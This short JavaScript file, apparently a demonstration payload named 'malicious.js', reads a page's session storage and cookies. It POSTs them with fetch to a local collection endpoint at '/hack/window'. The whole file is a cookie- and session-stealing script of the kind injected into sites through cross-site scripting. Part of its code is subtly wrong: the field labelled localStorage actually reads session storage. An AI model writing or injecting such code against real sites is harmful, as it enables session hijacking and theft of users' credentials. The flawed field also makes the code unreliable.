// write a logic to get the window object and send it to http://localhost:3002/hack/window as a POST message

console.log('malicious.js loaded');

alert('window', {
  sessionStorage: JSON.stringify(window.sessionStorage),
  cookieStorage: JSON.stringify(window.document.cookie),
  localStorage: JSON.stringify(window.sessionStorage),
});

fetch('http://localhost:3002/hack/window', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    sessionStorage: JSON.stringify(window.sessionStorage),
    cookieStorage: JSON.stringify(window.document.cookie),
    localStorage: JSON.stringify(window.sessionStorage),
  }),
})
  .then(res => res.json())
  .then(data => {
    console.log(data);
  });
